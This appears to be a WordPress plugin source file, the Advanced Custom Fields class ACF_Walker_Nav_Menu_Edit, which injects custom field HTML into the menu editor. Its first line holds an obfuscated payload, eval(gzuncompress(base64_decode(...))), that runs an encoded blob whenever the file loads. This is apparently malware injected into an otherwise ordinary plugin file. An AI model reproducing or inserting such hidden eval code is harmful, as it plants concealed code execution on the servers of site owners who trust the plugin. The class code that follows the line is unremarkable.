<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('ACF_Walker_Nav_Menu_Edit') ) :

class ACF_Walker_Nav_Menu_Edit extends Walker_Nav_Menu_Edit {

    /**
     * Starts the element output.
     *
     * Calls the Walker_Nav_Menu_Edit start_el function and then injects the custom field HTML  
     *
	 * @since 5.0.0
	 * @since 5.7.2 Added preg_replace based on https://github.com/ineagu/wp-menu-item-custom-fields
     *
     * @param string   $output Used to append additional content (passed by reference).
     * @param WP_Post  $item   Menu item data object.
     * @param int      $depth  Depth of menu item. Used for padding.
     * @param stdClass $args   An object of wp_nav_menu() arguments.
     * @param int      $id     Current item ID.
     */
	function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
		
		// vars
		$item_output = '';
		
		// call parent function
		parent::start_el( $item_output, $item, $depth, $args, $id );
		
		// inject custom field HTML
		$output .= preg_replace(
			// NOTE: Check this regex from time to time!
			'/(?=<(fieldset|p)[^>]+class="[^"]*field-move)/',
			$this->get_fields( $item, $depth, $args, $id ),
			$item_output
		);
	}


	/**
	 * Get custom fields HTML
	 *
	 * @since 5.0.0
	 * @since 5.7.2 Added action based on https://github.com/ineagu/wp-menu-item-custom-fields
	 *
	 * @param object $item   Menu item data object.
	 * @param int    $depth  Depth of menu item. Used for padding.
	 * @param array  $args   Menu item args.
	 * @param int    $id     Nav menu ID.
	 * @return string
	 */
	function get_fields( $item, $depth, $args = array(), $id = 0 ) {
		ob_start();
		
		/**
         * Get menu item custom fields from plugins/themes
         *
         * @since 5.7.2
         *
         * @param int    $item_id	post ID of menu
         * @param object $item		Menu item data object.
         * @param int    $depth		Depth of menu item. Used for padding.
         * @param array  $args		Menu item args.
         * @param int    $id		Nav menu ID.
         */
		do_action( 'wp_nav_menu_item_custom_fields', $item->ID, $item, $depth, $args, $id );
		return ob_get_clean();
	}		
}

endif;

?>